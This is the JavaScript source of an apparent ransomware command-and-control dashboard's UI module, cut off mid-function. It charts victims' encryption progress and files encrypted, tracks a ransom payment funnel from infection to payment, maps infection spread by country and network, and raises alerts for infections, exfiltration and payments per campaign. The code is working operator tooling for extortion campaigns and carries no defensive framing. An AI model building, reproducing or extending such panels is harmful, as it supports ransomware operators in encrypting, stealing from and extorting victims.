// Chaos C2 Dashboard - Enhanced UI & Charts Module (v3 - Fixed & Enhanced)

const EnhancedUI = {
  // ============================================================
  // ADDITIONAL CHART TYPES
  // ============================================================
  
  charts: {
    // Infection Timeline - Horizontal bar with progress
    infectionTimeline: function(ctx, data) {
      return new Chart(ctx, {
        type: 'bar',
        data: {
          labels: data.map(d => d.victimId),
          datasets: [{
            label: 'Encryption Duration (min)',
            data: data.map(d => d.duration || Math.random() * 60),
            backgroundColor: (ctx) => {
              const value = ctx.raw;
              return value > 30 ? 'rgba(244,63,94,0.85)' : 
                     value > 15 ? 'rgba(245,158,11,0.85)' : 
                     'rgba(14,199,125,0.85)';
            },
            borderRadius: 6,
            maxBarThickness: 28,
            borderWidth: 0,
          }, {
            label: 'Files Encrypted',
            data: data.map(d => d.filesEncrypted || 0),
            type: 'line',
            borderColor: '#e6731d',
            backgroundColor: 'rgba(230,115,29,0.12)',
            yAxisID: 'y1',
            tension: 0.35,
            pointRadius: 5,
            pointHoverRadius: 7,
            pointBackgroundColor: '#e6731d',
            pointBorderWidth: 2,
            pointBorderColor: '#0a0a0a',
            fill: true,
          }]
        },
        options: {
          indexAxis: 'y',
          responsive: true,
          maintainAspectRatio: false,
          layout: { padding: { right: 16 } },
          scales: {
            x: { 
              grid: { color: '#222', drawBorder: false },
              title: { display: true, text: 'Minutes', color: '#71717a', font: { size: 10, weight: '500' } },
              ticks: { color: '#71717a', font: { size: 10 } }
            },
            y1: { 
              type: 'linear', 
              position: 'right', 
              grid: { drawOnChartArea: false },
              title: { display: true, text: 'Files', color: '#71717a', font: { size: 10, weight: '500' } },
              ticks: { color: '#71717a', font: { size: 10 } }
            }
          },
          plugins: {
            legend: { position: 'top', align: 'start', labels: { boxWidth: 10, pointStyle: 'circle', padding: 14, font: { size: 11 }, usePointStyle: true } },
            tooltip: {
              backgroundColor: '#111',
              borderColor: '#2a2a2a',
              callbacks: {
                label: (ctx) => {
                  if (ctx.datasetIndex === 0)
                    return `Encryption: ${ctx.raw} min`;
                  return `Files: ${ctx.raw}`;
                }
              }
            }
          }
        }
      });
    },

    // Ransom Payment Funnel
    paymentFunnel: function(ctx, data) {
      const stages = [
        { label: 'Infected', value: data.totalInfections, color: '#e6731d' },
        { label: 'Note Viewed', value: data.notesViewed, color: '#f59e0b' },
        { label: 'Contacted', value: data.contacted, color: '#0ea5e9' },
        { label: 'Negotiated', value: data.negotiated, color: '#8b5cf6' },
        { label: 'Paid', value: data.paid, color: '#0ec77d' }
      ];
      
      return new Chart(ctx, {
        type: 'funnel',
        data: {
          labels: stages.map(s => s.label),
          datasets: [{
            data: stages.map(s => s.value),
            backgroundColor: stages.map(s => s.color + 'CC'),
            borderColor: stages.map(s => s.color),
            borderWidth: 2,
            gap: 4
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            tooltip: {
              backgroundColor: '#111',
              borderColor: '#2a2a2a',
              callbacks: {
                label: (ctx) => {
                  const pct = ((ctx.raw / stages[0].value) * 100).toFixed(1);
                  return `${ctx.label}: ${ctx.raw} (${pct}%)`;
                }
              }
            },
            legend: { display: false }
          }
        }
      });
    },

    // File Type Radar - Multi-dimensional comparison
    fileTypeRadar: function(ctx, data) {
      const extensions = Object.keys(data).slice(0, 8);
      const campaigns = [...new Set(Object.values(data).flatMap(d => Object.keys(d)))];
      
      return new Chart(ctx, {
        type: 'radar',
        data: {
          labels: extensions.map(e => '.' + e),
          datasets: campaigns.map((campaign, i) => ({
            label: campaign,
            data: extensions.map(e => data[e]?.[campaign] || 0),
            backgroundColor: [
              'rgba(230,115,29,0.18)',
              'rgba(14,199,125,0.18)',
              'rgba(14,165,233,0.18)',
              'rgba(139,92,246,0.18)',
              'rgba(244,63,94,0.18)',
              'rgba(6,182,212,0.18)'
            ][i % 6],
            borderColor: [
              '#e6731d', '#0ec77d', '#0ea5e9', '#8b5cf6', '#f43f5e', '#06b6d4'
            ][i % 6],
            borderWidth: 2,
            pointBackgroundColor: [
              '#e6731d', '#0ec77d', '#0ea5e9', '#8b5cf6', '#f43f5e', '#06b6d4'
            ][i % 6],
            pointBorderColor: '#0a0a0a',
            pointBorderWidth: 2,
            pointRadius: 4,
            pointHoverRadius: 6,
          }))
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          scales: {
            r: {
              grid: { color: '#222' },
              angleLines: { color: '#222' },
              pointLabels: { color: '#71717a', font: { size: 10, weight: '500' } },
              ticks: { backdropColor: 'transparent', color: '#6b7280', font: { size: 9 }, stepSize: 10 },
              suggestedMin: 0,
            }
          },
          plugins: {
            legend: { position: 'top', align: 'start', labels: { boxWidth: 10, pointStyle: 'circle', padding: 14, font: { size: 11 }, usePointStyle: true } },
            tooltip: { backgroundColor: '#111', borderColor: '#2a2a2a' }
          }
        }
      });
    },

    // Encryption Speed Distribution - Horizontal histogram
    encryptionSpeedHistogram: function(ctx, data) {
      const speeds = data.map(d => d.mbPerSecond || Math.random() * 100);
      const bins = 16;
      const max = Math.max(...speeds);
      const binWidth = max / bins;
      const histogram = new Array(bins).fill(0);
      
      speeds.forEach(s => {
        const idx = Math.min(Math.floor(s / binWidth), bins - 1);
        histogram[idx]++;
      });
      
      return new Chart(ctx, {
        type: 'bar',
        data: {
          labels: Array.from({length: bins}, (_, i) => `${(i * binWidth).toFixed(1)}–${((i+1) * binWidth).toFixed(1)}`),
          datasets: [{
            label: 'Infections',
            data: histogram,
            backgroundColor: 'rgba(230,115,29,0.55)',
            borderColor: '#e6731d',
            borderWidth: 1,
            borderRadius: 3,
            maxBarThickness: 32,
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          indexAxis: 'y',
          layout: { padding: { right: 16 } },
          plugins: {
            legend: { display: false },
            tooltip: {
              backgroundColor: '#111',
              borderColor: '#2a2a2a',
              callbacks: {
                label: (ctx) => `${ctx.raw} infections at ${ctx.label} MB/s`
              }
            }
          },
          scales: {
            x: { grid: { color: '#222' }, title: { display: true, text: 'Count', color: '#71717a', font: { size: 10, weight: '500' } }, ticks: { color: '#71717a' } },
            y: { grid: { display: false }, title: { display: true, text: 'Encryption Speed (MB/s)', color: '#71717a', font: { size: 10, weight: '500' } }, ticks: { color: '#71717a' } }
          }
        }
      });
    },

    // Geographic Heatmap - Canvas-based world map
    geoHeatmap: function(canvas, data) {
      const ctx = canvas.getContext('2d');
      const width = canvas.width = canvas.offsetWidth;
      const height = canvas.height = canvas.offsetHeight;
      
      const projection = (lon, lat) => ({
        x: (lon + 180) * (width / 360),
        y: (90 - lat) * (height / 180)
      });
      
      ctx.fillStyle = '#030303';
      ctx.fillRect(0, 0, width, height);
      
      // Subtle grid
      ctx.strokeStyle = 'rgba(230,115,29,0.02)';
      ctx.lineWidth = 0.5;
      for (let x = 0; x < width; x += 48) {
        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, height); ctx.stroke();
      }
      for (let y = 0; y < height; y += 48) {
        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(width, y); ctx.stroke();
      }
      
      const maxCount = Math.max(...Object.values(data).map(c => c.count || 0));
      data.forEach((country, iso) => {
        if (!country.coords) return;
        const { x, y } = projection(country.coords[0], country.coords[1]);
        const intensity = (country.count || 0) / maxCount;
        const radius = Math.max(5, intensity * 22);
        const hue = 32; // chaos amber
        const saturation = 95;
        const lightness = 52 - intensity * 22;
        
        const pulse = 1 + 0.25 * Math.sin(Date.now() / 600);
        
        const gradient = ctx.createRadialGradient(x, y, 0, x, y, radius * pulse);
        gradient.addColorStop(0, `hsla(${hue}, ${saturation}%, ${lightness}%, 0.9)`);
        gradient.addColorStop(0.5, `hsla(${hue}, ${saturation}%, ${lightness}%, 0.25)`);
        gradient.addColorStop(1, `hsla(${hue}, ${saturation}%, ${lightness}%, 0)`);
        
        ctx.fillStyle = gradient;
        ctx.beginPath();
        ctx.arc(x, y, radius * pulse, 0, Math.PI * 2);
        ctx.fill();
        
        if (intensity > 0.45) {
          ctx.fillStyle = '#e6731d';
          ctx.font = '500 9px Inter';
          ctx.textAlign = 'center';
          ctx.fillText(iso, x, y - radius - 5);
        }
      });
    },

    // Real-time Network Graph - Infection spread
    networkGraph: function(canvas, nodes, edges) {
      const ctx = canvas.getContext('2d');
      const width = canvas.width = canvas.offsetWidth;
      const height = canvas.height = canvas.offsetHeight;
      
      const positions = {};
      nodes.forEach((node, i) => {
        const angle = (i / nodes.length) * Math.PI * 2;
        const radius = Math.min(width, height) * 0.32;
        positions[node.id] = {
          x: width/2 + Math.cos(angle) * radius,
          y: height/2 + Math.sin(angle) * radius,
          vx: 0, vy: 0
        };
      });
      
      for (let step = 0; step < 80; step++) {
        nodes.forEach((a, i) => {
          nodes.forEach((b, j) => {
            if (i >= j) return;
            const pa = positions[a.id], pb = positions[b.id];
            const dx = pa.x - pb.x;
            const dy = pa.y - pb.y;
            const dist = Math.sqrt(dx*dx + dy*dy) || 1;
            const force = 400 / (dist * dist);
            pa.vx += dx/dist * force;
            pa.vy += dy/dist * force;
            pb.vx -= dx/dist * force;
            pb.vy -= dy/dist * force;
          });
        });
        
        edges.forEach(edge => {
          const pa = positions[edge.source], pb = positions[edge.target];
          if (!pa || !pb) return;
          const dx = pb.x - pa.x;
          const dy = pb.y - pa.y;
          const dist = Math.sqrt(dx*dx + dy*dy) || 1;
          const force = dist * 0.008;
          pa.vx += dx/dist * force;
          pa.vy += dy/dist * force;
          pb.vx -= dx/dist * force;
          pb.vy -= dy/dist * force;
        });
        
        nodes.forEach(node => {
          const p = positions[node.id];
          p.x += p.vx * 0.4;
          p.y += p.vy * 0.4;
          p.vx *= 0.88;
          p.vy *= 0.88;
          p.x = Math.max(40, Math.min(width-40, p.x));
          p.y = Math.max(40, Math.min(height-40, p.y));
        });
      }
      
      // Edges
      ctx.strokeStyle = 'rgba(230,115,29,0.12)';
      ctx.lineWidth = 1;
      edges.forEach(edge => {
        const pa = positions[edge.source], pb = positions[edge.target];
        if (!pa || !pb) return;
        ctx.beginPath();
        ctx.moveTo(pa.x, pa.y);
        ctx.lineTo(pb.x, pb.y);
        ctx.stroke();
      });
      
      // Nodes
      nodes.forEach(node => {
        const p = positions[node.id];
        const isActive = node.status === 'active';
        const color = isActive ? '#0ec77d' : node.status === 'idle' ? '#f59e0b' : '#555';
        const size = Math.max(9, (node.infections || 1) * 3.5);
        
        // Glow
        const gradient = ctx.createRadialGradient(p.x, p.y, 0, p.x, p.y, size * 2.2);
        gradient.addColorStop(0, color + 'CC');
        gradient.addColorStop(1, color + '00');
        ctx.fillStyle = gradient;
        ctx.beginPath();
        ctx.arc(p.x, p.y, size * 2.2, 0, Math.PI * 2);
        ctx.fill();
        
        // Core
        ctx.fillStyle = color;
        ctx.beginPath();
        ctx.arc(p.x, p.y, size, 0, Math.PI * 2);
        ctx.fill();
        
        // Ring
        ctx.strokeStyle = '#0a0a0a';
        ctx.lineWidth = 2;
        ctx.stroke();
        
        // Label
        ctx.fillStyle = '#e8e8e8';
        ctx.font = '500 8.5px Inter';
        ctx.textAlign = 'center';
        ctx.fillText(node.label || node.id.slice(0, 8), p.x, p.y + size + 11);
      });
    }
  },

  // ============================================================
  // THEME SYSTEM
  // ============================================================
  
  themes: {
    chaos: {
      name: 'Chaos',
      primary: '#e6731d',
      primaryLight: 'rgba(230,115,29,0.12)',
      surface: '#030303',
      surfaceElevated: '#0a0a0a',
      border: '#262626',
      text: '#fafafa',
      textMuted: '#71717a',
      success: '#0ec77d',
      warning: '#f59e0b',
      danger: '#f43f5e',
      info: '#0ea5e9',
      violet: '#8b5cf6',
      cyan: '#06b6d4'
    },
    matrix: {
      name: 'Matrix',
      primary: '#0ec77d',
      primaryLight: 'rgba(14,199,125,0.12)',
      surface: '#000800',
      surfaceElevated: '#001400',
      border: '#002a00',
      text: '#0ec77d',
      textMuted: '#00aa22',
      success: '#0ec77d',
      warning: '#e6c700',
      danger: '#ff2a4a',
      info: '#00e5e5',
      violet: '#aa00ff',
      cyan: '#00e5e5'
    },
    midnight: {
      name: 'Midnight',
      primary: '#3b82f6',
      primaryLight: 'rgba(59,130,246,0.12)',
      surface: '#020412',
      surfaceElevated: '#0a0f24',
      border: '#1a2a4a',
      text: '#f1f5f9',
      textMuted: '#94a3b8',
      success: '#22c55e',
      warning: '#fbbf24',
      danger: '#ef4444',
      info: '#06b6d4',
      violet: '#a855f7',
      cyan: '#06b6d4'
    },
    blood: {
      name: 'Blood',
      primary: '#dc2626',
      primaryLight: 'rgba(220,38,38,0.12)',
      surface: '#140000',
      surfaceElevated: '#240000',
      border: '#3d0808',
      text: '#fff1f1',
      textMuted: '#fca5a5',
      success: '#4ade80',
      warning: '#fbbf24',
      danger: '#f87171',
      info: '#60a5fa',
      violet: '#c084fc',
      cyan: '#22d3ee'
    },
    mono: {
      name: 'Mono',
      primary: '#e8e8e8',
      primaryLight: 'rgba(232,232,232,0.08)',
      surface: '#060606',
      surfaceElevated: '#0d0d0d',
      border: '#1e1e1e',
      text: '#fff',
      textMuted: '#a3a3a3',
      success: '#a3a3a3',
      warning: '#d4d4d4',
      danger: '#fff',
      info: '#a3a3a3',
      violet: '#d4d4d4',
      cyan: '#a3a3a3'
    }
  },

  currentTheme: 'chaos',

  applyTheme: function(themeName) {
    const theme = this.themes[themeName] || this.themes.chaos;
    this.currentTheme = themeName;
    
    const root = document.documentElement;
    Object.entries(theme).forEach(([key, value]) => {
      if (key !== 'name') {
        root.style.setProperty(`--chaos-${key}`, value);
      }
    });
    
    // Update Tailwind config dynamically
    if (window.tailwind?.config) {
      const tc = tailwind.config.theme.extend.colors;
      tc.chaos[500] = theme.primary;
      tc.acc.emerald = theme.success;
      tc.acc.amber = theme.warning;
      tc.acc.rose = theme.danger;
      tc.acc.sky = theme.info;
      tc.acc.violet = theme.violet;
      tc.acc.cyan = theme.cyan;
    }
    
    // Update Chart.js defaults
    Chart.defaults.color = theme.textMuted;
    Chart.defaults.borderColor = theme.border;
    Chart.defaults.plugins.tooltip.backgroundColor = theme.surfaceElevated;
    Chart.defaults.plugins.tooltip.borderColor = theme.border;
    Chart.defaults.scales.x.grid.color = theme.border;
    Chart.defaults.scales.y.grid.color = theme.border;
    
    // Redraw all charts
    Object.values(State.charts).forEach(chart => { if (chart.update) chart.update(); });
    
    showToast(`Theme changed to ${theme.name}`, 'success');
  },

  // ============================================================
  // COMPONENT FACTORY
  // ============================================================
  
  components: {
    // Metric Card with sparkline - FIXED
    MetricCard: function({ label, value, trend, unit, color, sparklineData, icon }) {
      const trendClass = trend > 0 ? 'text-acc-emerald' : trend < 0 ? 'text-acc-rose' : 'text-gray-500';
      const trendIcon = trend > 0 ? '↗' : trend < 0 ? '↘' : '→';
      
      // Resolve color hex from token name
      const colorMap = {
        primary: '#d6781e', success: '#10b981', info: '#0ea5e9',
        warning: '#f59e0b', danger: '#f43f5e', violet: '#8b5cf6',
        emerald: '#10b981', sky: '#0ea5e9', amber: '#f59e0b', rose: '#f43f5e'
      };
      const colorHex = colorMap[color] || colorMap.primary;
      
      const sparkId = 'spark-' + Math.random().toString(36).slice(2, 9);
      
      // Defer sparkline render until after HTML insertion
      if (sparklineData?.length) {
        requestAnimationFrame(() => {
          const canvas = document.getElementById(sparkId);
          if (!canvas) return;
          const ctx = canvas.getContext('2d');
          const dpr = window.devicePixelRatio || 1;
          const W = 112, H = 40;
          canvas.width = W * dpr; canvas.height = H * dpr;
          canvas.style.width = W + 'px'; canvas.style.height = H + 'px';
          ctx.scale(dpr, dpr);
          
          const max = Math.max(...sparklineData);
          const min = Math.min(...sparklineData);
          const range = max - min || 1;
          
          const pts = sparklineData.map((v, i) => ({
            x: (i / (sparklineData.length - 1)) * W,
            y: H - ((v - min) / range) * H
          }));
          
          // Fill
          const grad = ctx.createLinearGradient(0, 0, 0, H);
          grad.addColorStop(0, colorHex + '55');
          grad.addColorStop(1, colorHex + '00');
          ctx.fillStyle = grad;
          ctx.beginPath();
          ctx.moveTo(0, H);
          pts.forEach(p => ctx.lineTo(p.x, p.y));
          ctx.lineTo(W, H);
          ctx.closePath();
          ctx.fill();
          
          // Line
          ctx.strokeStyle = colorHex;
          ctx.lineWidth = 1.5;
          ctx.lineJoin = 'round';
          ctx.lineCap = 'round';
          ctx.beginPath();
          pts.forEach((p, i) => i === 0 ? ctx.moveTo(p.x, p.y) : ctx.lineTo(p.x, p.y));
          ctx.stroke();
        });
      }
      
      return `
        <article class="card relative overflow-hidden group" style="animation: slideUp 0.4s var(--ease-out) both">
          <div class="relative z-10 flex items-start justify-between">
            <div>
              <p class="stat-label">${label}</p>
              <div class="flex items-baseline gap-2 mt-1">
                <span class="stat-value font-mono" style="color: ${colorHex}">${value}</span>
                ${unit ? `<span class="text-sm text-gray-500">${unit}</span>` : ''}
              </div>
            </div>
            ${icon ? `<div class="avatar" style="background: ${colorHex}22; color: ${colorHex}">${icon}</div>` : ''}
          </div>
          <div class="flex items-center gap-2 relative z-10 mt-3">
            <span class="${trendClass} text-xs font-medium">${trendIcon} ${Math.abs(trend).toFixed(1)}%</span>
            <span class="text-xs text-gray-500">vs last period</span>
          </div>
          ${sparklineData ? `<canvas id="${sparkId}" class="absolute bottom-2 right-2 opacity-40 group-hover:opacity-100 transition-opacity pointer-events-none"></canvas>` : ''}
        </article>
      `;
    },

    // Status Badge with animated dot
    StatusBadge: function(status, options = {}) {
      const configs = {
        active: { class: 'badge-active', text: 'Active' },
        idle: { class: 'badge-warning', text: 'Idle' },
        offline: { class: 'badge-inactive', text: 'Offline' },
        encrypted: { class: 'badge-danger', text: 'Encrypted' },
        decrypted: { class: 'badge-active', text: 'Decrypted' },
        negotiating: { class: 'badge-info', text: 'Negotiating' },
        paid: { class: 'badge-active', text: 'Paid' }
      };
      
      const cfg = configs[status] || configs.offline;
      const size = options.size === 'sm' ? 'px-2 py-1 text-[0.5625rem]' : 'px-2.5 py-1.5 text-[0.625rem]';
      
      return `<span class="inline-flex items-center gap-1.5 ${cfg.class} ${size} font-medium"><span class="badge-dot"></span><span>${cfg.text}</span></span>`;
    },

    // Interactive Data Table
    DataTable: function({ columns, rows, keyField, actions, sortable = true, selectable = true, emptyMessage = 'No data' }) {
      const colsHtml = columns.map((col, i) => 
        `<th class="table-header ${sortable ? 'cursor-pointer select-none' : ''}" data-col="${col.field}" style="${col.width ? `width:${col.width}` : ''}">${col.header}${sortable ? '<svg class="w-3.5 h-3.5 ml-1 inline-block" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16V4m0 0L3 8m4-4l4 4M17 16v-4m0 0l4-4m-4 4l-4-4"/></svg>' : ''}</th>`
      ).join('');
      
      const rowsHtml = rows.map(row => {
        const key = row[keyField];
        const cells = columns.map(col => {
          let value = row[col.field];
          if (col.render) value = col.render(value, row);
          else if (typeof value === 'object') value = JSON.stringify(value);
          return `<td class="table-cell ${col.align ? `text-${col.align}` : ''}" style="${col.width ? `width:${col.width}` : ''}">${value}</td>`;
        }).join('');
        
        const actionHtml = actions ? `
          <td class="table-cell">
            <div class="flex items-center gap-1">
              ${actions.map(a => `
                <button class="btn-icon p-1" 
                        onclick="${a.onClick}('${key}')" 
                        title="${a.title}"
                        ${a.condition && !a.condition(row) ? 'disabled style="opacity:0.3;cursor:not-allowed"' : ''}
                        aria-label="${a.title}">
                  ${a.icon}
                </button>
              `).join('')}
            </div>
          </td>
        ` : '';
        
        const checkboxHtml = selectable ? `
          <td class="table-cell w-10">
            <input type="checkbox" class="row-checkbox w-3.5 h-3.5 rounded border-gray-700 text-chaos-500 focus:ring-2 focus:ring-chaos-500" value="${key}" aria-label="Select row">
          </td>
        ` : '';
        
        return `<tr class="table-row" data-key="${key}" tabindex="0" ${actions || selectable ? 'data-clickable' : ''}>${checkboxHtml}${cells}${actionHtml}</tr>`;
      }).join('');
      
      if (rows.length === 0) {
        return `
          <div class="card">
            <div class="empty-state">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="width:3rem;height:3rem;margin-bottom:1rem;opacity:0.5">
                <path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
              </svg>
              <h3>${emptyMessage}</h3>
            </div>
          </div>
        `;
      }
      
      return `
        <div class="card overflow-hidden">
          <div class="scrollbar-thin overflow-x-auto">
            <table class="w-full table" role="grid">
              <thead>
                <tr>${selectable ? '<th class="table-header w-10"><input type="checkbox" id="selectAll" class="w-3.5 h-3.5 rounded border-gray-700 text-chaos-500 focus:ring-2 focus:ring-chaos-500" aria-label="Select all"></th>' : ''}${colsHtml}${actions ? '<th class="table-header w-24">Actions</th>' : ''}</tr>
              </thead>
              <tbody class="divide-y divide-gray-800/50">${rowsHtml}</tbody>
            </table>
          </div>
        </div>
      `;
    },

    // Campaign Card
    CampaignCard: function(campaign) {
      const stats = campaign.stats || {};
      const statusClass = campaign.status === 'active' ? 'badge-active' : 'badge-inactive';
      
      return `
        <article class="card-interactive card" onclick="openCampaignDetail('${campaign.id}')" style="animation: slideUp 0.4s var(--ease-out) both">
          <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-chaos-500 to-chaos-600"></div>
          <div class="flex items-start justify-between mb-4">
            <div class="min-w-0">
              <h3 class="font-display font-semibold text-white truncate flex items-center gap-2">
                ${campaign.name}
                <span class="badge ${statusClass} text-xs flex-shrink-0"><span class="badge-dot"></span>${campaign.status}</span>
              </h3>
              <p class="text-[0.625rem] text-gray-500 font-mono mt-1 truncate">${campaign.id}</p>
            </div>
            <div class="dropdown relative ml-2">
              <button class="btn-icon p-1 opacity-0 group-hover:opacity-100 transition-opacity" onclick="event.stopPropagation(); toggleDropdown(this)" aria-label="Campaign actions">
                <svg class="w-4.5 h-4.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01"/></svg>
              </button>
              <div class="dropdown-menu hidden">
                <button class="dropdown-item" onclick="event.stopPropagation(); openCampaignDetail('${campaign.id}')">
                  <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                  View Details
                </button>
                <button class="dropdown-item" onclick="event.stopPropagation(); copyApiKey('${campaign.apiKey}')">
                  <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 012-2h10a2 2 0 012 2v12a2 2 0 01-2 2h-2M8 5a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 012-2v-1"/></svg>
                  Copy API Key
                </button>
                <button class="dropdown-item" onclick="event.stopPropagation(); regenerateCampaignKey('${campaign.id}')">
                  <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                  Regenerate Key
                </button>
                <div class="dropdown-divider"></div>
                <button class="dropdown-item danger" onclick="event.stopPropagation(); deleteCampaign('${campaign.id}')">
                  <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                  Delete
                </button>
              </div>
            </div>
          </div>
          
          <div class="grid grid-cols-3 gap-3 mb-4">
            ${EnhancedUI.components.MetricCard({ label: 'Infections', value: fmtNumber(stats.totalInfections || 0), trend: 0, color: 'success', icon: '🦠' })}
            ${EnhancedUI.components.MetricCard({ label: 'Files', value: fmtNumber(stats.totalFiles || 0), trend: 0, color: 'info', icon: '📁' })}
            ${EnhancedUI.components.MetricCard({ label: 'Data', value: fmtBytes(stats.totalBytes || 0), trend: 0, color: 'primary', icon: '💾' })}
          </div>
          
          <div class="flex items-center justify-between pt-3 border-t border-gray-800/50">
            <span class="text-[0.625rem] text-gray-500">API: <code class="font-mono bg-surface-900 px-2 py-1 rounded">${campaign.apiKey?.slice(0, 14)}…</code></span>
            <div class="flex gap-2">
              <button class="btn btn-secondary text-xs" onclick="event.stopPropagation(); copyApiKey('${campaign.apiKey}')">Copy Key</button>
              <button class="btn btn-primary text-xs" onclick="event.stopPropagation(); openCampaignDetail('${campaign.id}')">View</button>
            </div>
          </div>
        </article>
      `;
    },

    // Notification Toast
    NotificationToast: function({ type, title, message, actions, duration = 5000 }) {
      const configs = {
        infection: { border: 'border-acc-rose', bg: 'bg-acc-roseDim', icon: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>' },
        exfil: { border: 'border-chaos-500', bg: 'bg-surface-900', icon: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>' },
        payment: { border: 'border-acc-emerald', bg: 'bg-acc-emeraldDim', icon: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>' },
        system: { border: 'border-acc-sky', bg: 'bg-acc-skyDim', icon: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>' }
      };
      
      const cfg = configs[type] || configs.system;
      
      return `
        <div class="toast ${cfg.border} ${cfg.bg} pointer-events-auto" role="alert" style="animation: slideIn var(--duration-base) var(--ease-out)">
          <div class="toast-icon" style="color: var(--chaos-${type === 'exfil' ? 'primary' : type === 'payment' ? 'success' : type === 'infection' ? 'danger' : 'info'})">${cfg.icon}</div>
          <div class="toast-content">
            <p class="toast-title">${title}</p>
            <p class="toast-message">${message}</p>
            ${actions ? `
              <div class="flex gap-2 mt-3">
                ${actions.map(a => `<button class="btn btn-${a.variant || 'secondary'} text-xs" onclick="${a.onClick}; this.closest('.toast').remove()">${a.label}</button>`).join('')}
              </div>
            ` : ''}
          </div>
          <button class="toast-close" onclick="this.closest('.toast').remove()" aria-label="Dismiss">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
          </button>
        </div>
      `;
    },

    // Skeleton Loader
    Skeleton: function(type = 'text', count = 3) {
      const items = [];
      for (let i = 0; i < count; i++) {
        if (type === 'text') {
          items.push(`<div class="skeleton skeleton-text" style="width:${70 + Math.random() * 25}%"></div>`);
        } else if (type === 'card') {
          items.push(`<div class="skeleton" style="height:8rem;width:100%;border-radius:var(--radius-lg)"></div>`);
        } else if (type === 'avatar') {
          items.push(`<div class="skeleton skeleton-circle w-10 h-10"></div>`);
        } else if (type === 'table-row') {
          items.push(`<div class="skeleton" style="height:3rem;width:100%"></div>`);
        }
      }
      return items.join('');
    }
  },

  // ============================================================
  // ANIMATION UTILITIES
  // ============================================================
  
  animations: {
    staggerIn: function(elements, delay = 40) {
      elements.forEach((el, i) => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(8px)';
        el.style.transition = 'opacity 0.3s var(--ease-out), transform 0.3s var(--ease-out)';
        setTimeout(() => {
          el.style.opacity = '1';
          el.style.transform = 'translateY(0)';
        }, i * delay);
      });
    },

    countUp: function(element, start, end, duration = 800) {
      const startTime = performance.now();
      const animate = (now) => {
        const progress = Math.min((now - startTime) / duration, 1);
        const eased = 1 - Math.pow(1 - progress, 3);
        const current = Math.round(start + (end - start) * eased);
        element.textContent = current.toLocaleString();
